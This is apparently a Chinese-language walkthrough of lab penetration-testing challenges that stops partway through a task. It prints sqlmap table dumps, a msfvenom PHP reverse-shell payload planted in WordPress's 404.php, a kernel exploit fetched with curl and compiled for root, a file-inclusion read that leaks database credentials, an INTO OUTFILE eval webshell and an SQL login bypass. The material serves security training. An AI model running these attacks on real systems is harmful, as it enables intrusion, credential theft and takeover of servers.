1.通过分析靶机Server2101页面信息，寻找漏洞页面，将WEB服务存在SQL注入漏洞的页面名称作为Flag提交；\n\n```\n访问靶机URL：http://192.168.31.130/\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/aa9N8Cy6YKwVnNva1710404845.png)\n\n点击按钮跟进，存在一个输入框查询的页面，该页面存在SQL注入漏洞。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/orFswvkCyieL8Ksz1710404845.png)\n\n##### FLAG1: index2.php\n\n#### 2.通过本地PC中的渗透测试平台Kali对靶机进行SQL注入攻击，获取靶机的数据库信息，将用来存放WEB服务的数据库名称作为Flag提交； \n\n随意输入数据进行查询，发现是GET传参：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/3RZepYyYQwL0VIeS1710404846.png)\n\n且为布尔类型的注入，只回显查询结果 不回显查询内容。所以我们需要用盲注、延时注入来注入，遇到这种注入可以直接采用**sqlmap**来帮助我们注入。\n\n```c++\nsqlmap -u \"http://192.168.31.130/index2.php?name=1&submit=%E6%9F%A5%E8%AF%A2\" --batch --current-db //获取当前数据库\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LtNFrDww3LFanjpK1710404846.png)\n\n##### FLAG2: webiu\n\n#### 3.通过本地PC中的渗透测试平台Kali对靶机进行SQL注入攻击，获取靶机的数据库信息，将用来存放WEB服务用户的表名称作为Flag提交；\n\n```c++\nsqlmap -u \"http://192.168.31.130/index2.php?name=1&submit=%E6%9F%A5%E8%AF%A2\" --batch -D webiu --tables //查询数据库为webiu的所有表名\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/DW3ZFTOWGGrEdPTb1710404846.png)\n\n查询结果只有两个，逐一尝试即可。不过一般存放WEB服务用户信息的表都带有user之类的，所以这里表名是 **iuser**\n\n##### FLAG3: iuser\n\n#### 4.通过本地PC中的渗透测试平台Kali对靶机进行SQL注入攻击，获取靶机的数据库信息，将用来存放WEB登陆用户admin用户的明文密码作为Flag提交；\n\n```c++\nsqlmap -u \"http://192.168.31.130/index2.php?name=1&submit=%E6%9F%A5%E8%AF%A2\" --batch -D webiu -T iuser --dump //导出数据库webiu下的iuser表的所有字段和内容\n```\n\n知道数据库和表名后可以直接用dump，会直接导出表下的字段名和字段内容。\n\n因为是盲注加上是长密码 所以这里sqlmap跑的会比较慢，要等待一会。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/CZnploa4L229681Q1710404847.png)\n\n跑出来是md5值的密文，sqlmap会帮我们尝试解密md5，得到明文密码为123321\n\n##### FLAG4: 123321\n\n\n\n### *系统漏洞利用与提权（wordpress+提权）\n\n任务环境说明：\n\t服务器场景：PYsystem001\n\t服务器场景操作系统：Ubuntu（显示链接）\n\t服务器用户名:未知 密码：未知\n\n#### 1.使用nmap扫描靶机系统，将靶机开放的端口号按从小到大的顺序作为FLAG（形式：[端口1,端口2…,端口n]）提交；\n\n​\t探测开了哪些端口使用nmap的**Pn、sS**即可，这样会快很多\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/HXCXfYoujT8AT7I51710404847.png)\n\n#####\tFLAG1: [443,8080]\n\n#### 2.通过上述端口访问靶机系统，使用弱口令进行登录，将正确的用户名和密码作为FLAG（形式：[用户名,密码]）提交；\n\n​\t扫描出了443和8080，**说明是https服务，所以访问时要用https://协议**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/5VxLYeCIz5JbaFt01710404847.png)\n\n​\t访问得到wordpress网站，不知道有哪些网页用**dirb**或者**dirbuster**扫描下。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kyLrwSeWp0P0XGN51710404847.png)\n\n​\t有一个phpmyadmin和wordpress目录，题目让我们用弱口令登录，那么wordpress一般的登录页面在**wp-login、wp-admin**\n\n​\t访问页面：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/8Nh0SrOo4IgVcQUk1710404848.png)\n\n​\t用弱口令登录，一般账户都是**admin**，密码就是**123456、admin、admin123**这种\n\n​\t使用admin 123456成功登录\n\n#####\tFLAG2: [admin,123456]\n\n\n\n#### 3.利用Kali渗透机生成反弹木马，将生成木马命令执行后提示的第四行的首个单词作为FLAG（形式：[单词]）提交；\n\n​\t制作反弹木马，一般指的是msfvenom生成，结合下题的监听基本可以确认使用msfvenom了。\n\n​\tphp木马用的payload是 **php/meterpreter/reverse_tcp**\n\n```\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw > msf.php\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/SiKjwqMl91sZmOdX1710404848.png)\n\n##### \tFLAG3: [Payload]\n\n#### 4.对上述木马文件进行修改后上传到靶机系统中，使用MSF开启监听，将获得的当前权限的用户名作为FLAG（形式：[用户名]）提交；\n\n​\t这里攻击方式是利用wordpress弱口令进入后台后，**利用后台权限修改php文件**，插入我们制作好的木马 最后反弹至我们监听的端口。\n\n​\t由于wordpress的插件都是php文件，我们能修改文件就能插入恶意代码至php文件中，导致了RCE漏洞。\n\n​\t还有一点就是文件最好修改**404.php**，原因是因为我们并不知道修改的文件具体的路径，但我们修改了404.php文件后，出现报错时就会显示404.php的内容，方便我们利用。\n\n​\t**Appearance -> Editor -> 修改404.php文件**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/wCqsGU9ARDf75dcu1710404848.png)\n\n将我们先前用msfvenom生成好的木马内容复制到文件尾部。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/w38m0aB4WS5Qari91710404848.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/UQ5YZit1vvaFgCws1710404848.png)\n\n​\t最后保存，木马就成功插入到当前服务器了。\n\n​\t现在我们需要使用msfconsole的handler模块进行监听 来接收shell\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/IcLHwnJ7WcyBtYzg1710404849.png)\n\n之后Run运行。我们再去访问一个不存在的页面，触发404.php，就能发现shell弹回了自己的监听里了。\n\n当我们访问不存在的页面，首先会去访问404.php，我们先前已经将恶意代码插入了该文件中，所以当访问404.php后就会解析我们的插入的恶意代码，从而弹回我们的msf监听里。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kt9nf6G9N1Eq5iEr1710404849.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JZ8FjDYWd7vdVg7Y1710404849.png)\n\n拿到shell了，就是按题目要求的去做就好了。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lYQK5HDTm7jFTS2r1710404849.png)\n\n#####\tFLAG4: [daemon]\n\n#### 5.查看系统内核版本信息，将系统内核版本号作为FLAG（形式：[版本号]）提交；\n\n​\t使用**uname -r**命令\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2dxWHI9IFGs5VgVI1710404849.png)\n\n#####\tFLAG5: [3.13.0-45-generic]\n\n#### 6.在Kali攻击机中查找可使用的漏洞源码，将找到的漏洞源码文件名作为FLAG（形式：[文件名]）提交；\n\n​\t结合上题的内核，以及下题要我们找root目录下的txt文件，且当前我们的权限还是webshell。所以这里的意思就是让我们 **提权**\n\n​\t提权需要用 **searchsploit** 来查找对应版本的提权文件。\n\n```\nsearchsploit 3.13.0 //查找存在 3.13.0 版本的提权文件\nsearchsploit -m 37292.c //下载找到的提权文件\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/SNpHYP5i67qb3bVp1710404850.png)\n\n​\t像这里我们找到了37292.c文件，一般提权都是C++或C文件。再用searchsploit -m下载即可。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Khe3YEYuBvgkFv9z1710404850.png)\n\n​\t提权文件下到了我们的kali中，但提权是在靶机里实现的。\n\n​\t所以这里kali需要开启ftp、http等服务来共享这个提权文件，再让靶机去访问文件、下载，最后编译、运行、提权。\n\n```c++\nKali: //攻击机操作\nservice apache2 start\ncp 37292.c /var/www/html\nchmod 777 /var/www/html/37292.c\n\nLinux: //靶机操作\ncd /tmp \t// tmp文件一般都有权限来创建文件\ncurl http://IP/37292.c -O // 下载靶机的提权文件到当前目录\ngcc 37292.c -o 37292\t//gcc编译得到可执行文件\nchmod 777 37292\t// 赋予提权文件可执行权限\n./37292\t\t//运行、提权\n```\n\n​\t攻击机：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Ze8qZJ2NRt9KHPre1710404850.png)\n\n​\t靶机：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/IQeMOUk1pF3X8y4u1710404850.png)\n\n​\t至此提权成功。\n\n#####\tFLAG6: [37292.c]\n\n#### 7.利用上述漏洞源码后获得到的靶机/root下的唯一.txt文件的文件名作为FLAG（形式：[文件名]）提交；\n\n​\t有权限就是简单题了。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kDCUEuKlUV4Cg1q81710404850.png)\n\n#####\tFLAG7: [adftutij]\n\n#### 8.利用上述漏洞源码后将获得到的靶机/root下的唯一.txt文件的文件内容作为FLAG（形式：[文件内容]）提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kQ4yyH6WkWGLE5DA1710404850.png)\n\n\n\n#####\tFLAG8: [hyjufk983]\n\n\n\n### 网页渗透（CTF-Web）\n\n任务环境说明：\n\t服务器场景：Server2120\n\t服务器场景操作系统：未知（封闭靶机）\n\t用户名:未知 密码：未知\n\n*这里没有准确的环境，使用相似的环境来尝试的。\n\n#### 1.访问服务器的网站主页，猜测后台数据库中本网页中应用的库名称长度，将长度作为flag提交；\n\n扫描靶机服务\n\n```\ndirb http://192.168.31.117/\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/DTzsYZmWSCZhPlnr1710404851.png)\n\n访问后发现在 /3/ 目录存在SQL注入漏洞。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2DQezpDg0kOsq3fc1710404851.png)\n\n用sqlmap跑下库。\n\n```\nsqlmap -u \"http://192.168.31.117/3/index.php\" --data \"id=1\" --current-db --batch // 探测使用的数据库\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/pyI3HrIEqzww1FmT1710404851.png)\n\n跑出数据库 **hello** 长度为5\n\n##### FLAG1: 5\n\n#### 2.访问服务器的网站主页，猜测后台数据库中本网页中应用的库名称，将名称作为flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/pyI3HrIEqzww1FmT1710404851.png)\n\n##### FLAG2: hello\n\n#### 3.访问服务器的网站主页，猜测后台数据库中本页面中应用的表名称长度，将表名称长度作为flag提交；\n\n```\nsqlmap -u \"http://192.168.31.117/3/index.php\" --data \"id=1\" -D hello --tables --batch//指定数据库为hello下的所有表名\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/rFHPwFLMiHDLKTLc1710404851.png)\n\n跑出来表名 **user** 长度为4\n\n##### FLAG3: 4\n\n#### 4.访问服务器的网站主页，猜测后台数据库中本网页中应用的表名称，将名称作为flag提交\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/rFHPwFLMiHDLKTLc1710404851.png)\n\n##### FLAG4: user\n\n#### 5.访问服务器的网站主页，猜测后台数据库中本页面中第二个应用的字段名称，将名作为flag提交。\n\n```\nsqlmap -u \"http://192.168.31.117/3/index.php\" --data \"id=1\" -D hello -T user --dump --batch // 指定数据库hello的user表下的所有字段和内容\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/uH4buwmMGgxL9fQ21710404852.png)\n\n##### FLAG5: hello2\n\n#### 6.访问服务器的网站主页，猜测后台数据库中本页面中ID为1的用户名，将用户名作为flag提交。\n\n无环境\n\n\n\n### *隐藏信息探索\n\n任务环境说明：\n\t服务器场景：Web20200529\n\t服务器场景操作系统：未知 （关闭链接）\n\n#### 1.  通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，找到登录界面中的FLAG，并将FLAG提交；\n\nctrl+U发现class.css，跟进发现flag\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/PSzDlN4TebnxEqNv1710404852.png)\n\n##### FLAG1: WELCOME TO CSS!\n\n#### 2.  通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，找到登录界面背景中的FLAG，并将FLAG提交；\n\nF12开发者工具，点击网络，查看网页加载情况。\n\n发现了bgf.jpg：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JJXaLKPSrhoZOxBr1710404852.png)\n\n 访问、下载到本地，然后用winhex分析下。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/89Rpi5oz8F41tg3I1710404853.jpg)\n\n在图片尾部发现额外数据：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/oz4fJpnCBmhAJGjQ1710404853.png)\n\n##### FLAG2: Picturemerge\n\n#### 3.  通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，在登录界面中登录，登录成功后在成功的界面中找到FLAG并提交；\n\n 前端f12，找到input框的maxlength属性，将0修改为20，修改足够长的大小即可。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/cTu5dKQOlACF1N6m1710404853.png)\n\n然后在登录框输入万能密码```1' or 1=1 or '1'``` 登录，就可以跳转至成功页面了。\n\n或者burpsuite抓包，发送带有万能密码的请求：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/3AlqiD0uHrjQFu781710404853.png)\n\n在响应包中发现是302跳转，并找到了跳转的页面为 **success.html**\n\n由于访问success.html也是302跳转，所以建议用爬虫访问，来看下请求。或者用burpsuite也可以\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ocf17g71Lvva2dMY1710404854.png)\n\n##### FLAG3: 4C6F67696E207375636365737366756C\n\n#### 4.  通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，登录成功后找到页面中的月亮，将月亮中的信息解密，并将解密后的信息作为FLAG提交；\n\n 登陆成功后页面如下：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ZGOSdAP6sp41AAov1710404854.png)\n\n点击月亮，发现是一个弹窗，内容是base64\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kBO0GvQhSmisuJNu1710404855.png)\n\n用python的base64库解密：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/rnsvt9Twk9ovN38n1710404855.png)\n\n##### FLAG4: Base64decryptedsuccessfully\n\n#### 5.  通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，登录成功后找到页面中的十字星，将十字星中页面内容进行下载，将下载到的文件解密，并将解密后的文件内容作为FLAG提交；\n\n 点击页面中的十字星，发现是一个链接跳转，下载了一个压缩包\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jBkwFbC8oPExpOak1710404855.png)\n\n下载打开压缩包发现是加密的：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Ik5Lv1vmNvLXlHzB1710404856.png)\n\n这里是伪加密，winhex打开文件 将zip的加密识别段奇数位修改为偶数位即可\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/llbG6pOFDFMHfbCf1710404856.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/yOuOn7A1QNgPlQ651710404857.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/R9904mte2SNQgh8v1710404857.png)\n\n解压，字节这么小一定不是图片文件了，winhex打开分析得到flag：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/hS2h6Nyx25m17hl71710404857.png)\n\n##### FLAG5: UF71K2TW5JM88QZ8WMNTWKUY4\n\n#### 6.  通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，在登录界面中登录，登录失败后找到页面中的链接访问连接并下载文件，将文件中的隐藏文件全称作为FLAG提交；\n\n返回登录页面，随意输入内容登录，发现跳转到了**failure.html**\n\n同样爬虫访问看请求：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/pkdYNTXpz5uPQ2KI1710404857.png)\n\n得到一个**treasure.html** 跟进：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/XO3eNWm2GiHHOxJK1710404857.png)\n\n访问bg.jpg下载该图片 这张图片与上面的图片显示一样，但是这张图片存在隐写\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/DWb3wBxNVM0gxKYB1710404857.jpg)\n\n打开kali，将图片放入虚拟机中，使用steghide工具进行隐藏信息提取：\n\n```c++\nsteghide extract -sf bg.jpg // extract提取\nEnter passphrase:\t\t//这里密码使用 空密码 一定是空密码！！\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/vEjxcUZIjIyMo5va1710404858.png)\n\n##### FLAG6: a.txt\n\n#### 7.  通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，在登录界面中登录，登录失败后找到页面中的链接访问连接并下载文件，将文件中隐藏信息文件的内容作为FLAG提交；\n\n 打开a.txt发现乱码：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/enRslr87V5BOFII61710404858.png)\n\n看到PNG头，就知道是png图片文件了，修改后缀后再次打开得到flag：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/J5G2NGH1zWojx0mL1710404858.png)\n\n##### FLAG7: It is over Look back\n\n#### 8.  通过本地PC中渗透测试平台Kali对服务器场景Web20200529中的网站进行访问，寻找每页中的隐藏信息，将每条信息按顺序合并，作为FLAG提交；\n\n隐藏信息1：```http://192.168.31.129/index.html``` **Please**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Egllr9iGFQIlaXqA1710404859.png)\n\n隐藏信息2：```http://192.168.31.129/class.css``` **check**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ZsrbtT3s9HQqayTV1710404859.png)\n\n隐藏信息3：```http://192.168.31.129/dlc.html``` **every**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/39ZUhhaikouRQlr01710404859.png)\n\n隐藏信息4：```http://192.168.31.129/treasure.html``` **question**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/OC7SCNwV9wLlzmKc1710404859.png)\n\n##### FLAG8: Please check every question\n\n### *Web隐藏信息获取\n\n任务环境说明：\n\t服务器场景名：web20200604\n\t服务器场景用户名：未知（关闭链接）\n\n#### *1.   通过本地PC中渗透测试平台Kali使用Nmap扫描目标靶机HTTP服务子目录，将扫描子目录命令所需参数及第四条扫描结果关键目录以&符号拼接，作为Flag提交（例：-p 22&/root/）；\n\n这里要用到nmap的script参数，这里的参数模板名要记下\n\n```\nnmap --script http-enum\n```\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/gwUEJptYCsIliT3a1710404859.png)\n\n##### FLAG1: --script http-enum&/auth/\n\n#### 2.   通过本地PC中渗透测试平台Kali访问目标靶机管理登录页面，将管理登录页面的文件名（例：admin.php）作为Flag提交；\n\n访问：\n\n```\nhttp://172.16.101.250/auth/\n```\n\n查看源码，发现当前页面是个无效前端。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/FElOojVdIfGbgwtf1710404860.png)\n\nbase64解密得到 **adminLogin.php**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/H5hNsY3Y5cUamS6W1710404860.png)\n\n#####  FLAG2: adminLogin.php\n\n#### 3.   通过本地PC中渗透测试平台Kali使用SQL注入扫描工具对目标靶机HTTP服务进行SQL盲注注入测试，将注入成功所需参数名称以&符号拼接，作为Flag提交；\n\n```\nsqlmap -u \"http://172.16.101.250/auth/adminLogin.php?usr=&pwd=\" --current-db --level 4 \n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/luwBJ4Piv9gsP1jQ1710404860.png)\n\n```\nsqlmap -u \"http://172.16.101.250/auth/adminLogin.php?usr=&pwd=\" -D data --level 4 --dump\n```\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/K3YVqa0ZB0dnSHdT1710404860.png)\n\n##### FLAG3: u&level\n\n#### 4.   通过本地PC中渗透测试平台Kali访问目标靶机管理登录页面，使用正确的管理员用户名及密码登录，使用Python将导致登录失败的参数和值转换为正确的格式，将异常参数的值转换后作为Flag提交；\n\n用第三题的账号 **master** 密码 **P#ssw$rd**\n\n然后用python的**urllib.request的quote**方法url编码\n\n```python\nfrom urllib.request import quote\nprint(quote(\"P#ssw$rd\"))\n```\n\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/EDITpVyxVGKyqLDk1710404861.png)\n\n#####  FLAG4: P%23ssw%24rd\n\n#### 5.   通过本地PC中渗透测试平台Kali访问目标靶机管理登录页面，使用正确的管理员用户名及密码登录，将登录成功后界面返回结果的第一行文字作为Flag提交；\n\n ```\nhttp://172.16.101.250/auth/adminLogin.php?usr=master&pwd=P%23ssw%24rd\n ```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/JJ3bPBAmximvwqfB1710404861.png)\n\n##### FLAG5: The password is correct,Please enter the two-setp authentication key:\n\n#### 6.   通过本地PC中渗透测试平台Kali访问目标靶机HTTP服务，将登录成功后的返回结果作为Flag提交；\n\n将结果中stepkey **000111** 输入\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/TUKyNUdBu9L1v09h1710404861.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/9Bvh5t8rPmGePg491710404861.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/MKvf4EAubKMr41lF1710404861.png)\n\n##### FLAG6: Flag{MASTER01}\n\n\n\n### *暴力破解（login爆破密码）\n\n任务环境说明：\n\t服务器场景名称：sql008\n\t服务器场景用户名：administrator；密码：未知（封闭靶机）\n\n#### [说明] 真实的做题过程\n\n这道题不是很好，因为后面的路径以及FTP文件都是我渗透进去才发现的。\n\n刚开始用dirb爆破路径只爆破出一个 ```web``` 路径，没有后面的burp路径\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/GEbnMKklYErRObzY1710404861.png)\n\n访问该路径，就开始后面的渗透了。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/eMiyUyB6SQcPVdxt1710404861.png)\n\n在 **About** 页面中发现url可能存在文件包含\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/L58psnm3vN4HZxQ51710404862.png)\n\n传一个php伪协议读源码\n\n```\nphp://filter/convert.base64-encode/resource=about.php\n```\n\n成功读取，回显base64字符串。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/UcZp0kCCIlOFK1h31710404862.png)\n\n解密得到了about.php页面的源码\n\n```php\n<?php\n$f = $_GET['f'];\ninclude_once('sys/config.php');\ninclude($f);\n?>\n<div class=\"row\">\n            <div class=\"span2\">\n            </div>\n            <div class=\"span10\">\n                <div id=\"content\">\n\t\t\t\t\t<div class=\"page-header\">\n                        <h4>关于 ZVulDrill</h4>\n                        <hr>\n\t\t\t\t\t\t<p>\n                            <b>[测试环境]</b><br />\n\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t<li>Apache 2.2.22</li>\n\t\t\t\t\t\t\t\t<li>PHP 5.3.13</li>\n\t\t\t\t\t\t\t\t<li>MySQL 5.5.24</li>\n\t\t\t\t\t\t\t</ul>\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t<ul>php配置文件中：\n\t\t\t\t\t\t\t\t<li>allow_url_include = on</li>\n\t\t\t\t\t\t\t\t<li>allow_url_fopen = on</li>\n\t\t\t\t\t\t\t\t<li>magic_quotes_gpc = off</li>\n\t\t\t\t\t\t\t</ul>\n                        </p>\n                        <hr>\n                        <p>\n                            <b>[联系]</b><br>\n                            Email：flag:0601<br>\n\t\t\t\t\t\t\t欢迎一起交流学习：flag\n:0601                        </p>    \n                    </div>\n                </div>\n            </div>\n        </div>\n<?php \nrequire_once('footer.php');\n?>\n```\n\n页面中关键信息就是 ```sys/config.php``` 一般这种带有config的 且每个页面都会包含的 很有可能就是一个数据库连接的文件，那么就会存在数据库的配置信息。\n\n再去读取 ```sys/config.php``` 的源码\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2hsQHlDti9aH5B3c1710404862.png)\n\n```\n﻿<?php\n//链接数据库\n$host = 'localhost';\n$username = 'root';\n$password = 'good';\n$database = 'web';\n$dbc = mysqli_connect($host, $username, $password, $database);\nif (!$dbc)\n{\n\tdie('Could not connect: ' . mysql_error());\n}\n\n//启用session\nsession_start();\n\n//根目录\n$basedir = '/web'; \n\n//载入函数库\ninclude_once('lib.php');\n?>\n\n```\n\n得到账号密码为 ```root;good```\n\n再结合我们之前扫描中看到的**phpMyAdmin**或者扫描中结果的**3306**端口，就说明我们可以远程连接服务器的数据库，并且利用select来创造一个webshell木马。\n\n那么我们还需要服务器的绝对路径，这个路径也是利用漏洞找到的。\n\n因为php开启了报错，所以在文件包含处，包含一个不存在的文件就会把路径泄露出来。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Ihw2SvYItmvKcBWe1710404862.png)\n\n```\n路径：C:\\phpstudy\\\n```\n\n那么我们构造木马的一句话就可以写了：\n\n```mysql\nSELECT \"<?php @eval($_POST[s]);?>\" INTO OUTFILE \"C:/phpstudy/shell.php\"; // 注意这里路径要用 / 如果是反斜杠则写不了。\n```\n\n利用得到的账号密码登录phpmyadmin，在select处执行该命令。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/GVP84DTVZec7vXHZ1710404862.png)\n\n之后访问 **/shell.php** 再用蚁剑连接即可拿到webshell。\n\n拿到webshell后，后面的操作懂得都懂了。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/MkC00a56IJ5F26UO1710404863.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/auxSmpVdrhme2VYZ1710404863.png)\n\n在一大堆的文件中，找到了这个**burp**文件夹，发现题目跟这个文件夹有关。\n\n以及在**c:\\ftp**找到了字典文件：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/GRUp8aVpOjz2VvbH1710404863.png)\n\n这个web页面还有很多漏洞，比如 **回显型sql注入、后台弱口令admin 123456、文件上传 **等等，可以自己去挖掘挖掘。\n\n#### 1.  使用渗透机场景kali中工具扫描服务器场景，将iis的版本号作为flag提交；\n\n```\nnmap -sV 192.168.31.180\n```\n\n这题的网页端口是8081，需要注意下端口。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ZvpNRZhJiUFtm97x1710404863.png)\n\n#####  FLAG1: Microsoft IIS httpd 7.5\n\n#### 2.  使用渗透机场景windows7访问服务器场景，并下载某文件夹下的web目录下的username.txt和wxl_pass_burp.txt，并将username.txt中的用户数量作为flag提交；\n\n本以为这题字典是在是某个路径下的，但当我渗透进去之后才发现字典都在ftp服务里。。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/FEYLmGXY3yqgx0hB1710404863.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/c7KbPeyRPXZdyvHF1710404864.png)\n\n因为ftp的端口是2121，所以这里用windows搞比较麻烦，最好是用cmd来下载。\n\ncmd的ftp登录用户名要输入 **Anonymous** 匿名用户，才能进去 因为windows资源管理器的是已经帮我们填好用户了\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ST3mYq70Uj9TwGLj1710404864.png)\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/tpPBvyuzQGNBFRqC1710404864.png)\n\n##### FLAG2: 7\n\n#### 3.  使用渗透机场景windows7访问服务器中的暴力破解首页，并将首页的flag提交；\n\n 访问靶机页面：```http://192.168.31.180:8081/burp/```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/0z0zskjNm48E3ob11710404864.png)\n\n查看源码，搜索flag：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/KsWdLBfSyvWgQGon1710404864.png)\n\n##### FLAG3: zhedounengkanjian666\n\n#### 4.  使用渗透机场景windows7访问服务器场景web暴力破解页面（结合1、2题），进入基于表单的暴力破解进行账号密码的爆破，将爆破后返回的flag提交；\n\n后面几题就是burpsuite抓包爆破的操作，比较简单的。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/aPkyVuqFDtXKuwl01710404864.png)\n\n攻击方式选最后一个，然后payload选择username和password\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/toOpyoW4kQ1QAD1h1710404865.png)\n\n分别导入下载的**username.txt**和**wxl_pass_burp.txt**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/2jrpMh4QIXFsiyDY1710404865.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Z6DnLIg87TEHENSP1710404865.png)\n\n开始爆破，找响应长度不同的包，得到flag\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/yV2g0TFz6sSguNH51710404865.png)\n\n#####  FLAG4: success\n\n#### 5.  使用渗透机场景windows7访问服务器场景web暴力破解页面（结合1、2题），进入验证码绕过（on server）进行账号密码的爆破，将爆破后返回的flag提交；\n\n 带有验证码的爆破，就是抓包前设置好正确的验证码\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qDj5WzvlqJmfH2uM1710404866.png)\n\n然后抓到包**不要放包** 以防验证码刷新，直接放到 Intruder 重复第四题的操作，最后爆破出来即可。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/9w6CGCOpN1X55sDy1710404866.png)\n\n##### FLAG5: hello_boy\n\n#### 6.  使用渗透机场景windows7访问服务器场景web暴力破解页面（结合1、2题），进入验证码绕过（on client）进行账号密码的爆破，将爆破后返回的flag提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/xaTRl8aUX2QdprQh1710404866.png)\n\n跟上题一样，先设置好验证码，最后不要放包 爆破即可。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/er6C9prEzcIf8Aui1710404866.png)\n\n##### FLAG6: zhenbang\n\n\n\n### *SQL注入测试（shopxp+sql注入）\n\n任务环境说明：\n\t服务器场景：Server12\n\t服务器场景操作系统：未知（关闭链接）\n\n#### 1.  已知靶机存在网站系统，使用Nmap工具扫描靶机端口，并将网站服务的端口号作为Flag（形式：Flag字符串）值提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/253kobFpKzs7bSAB1710404866.png)\n\n##### FLAG1: 8089\n\n#### 2.  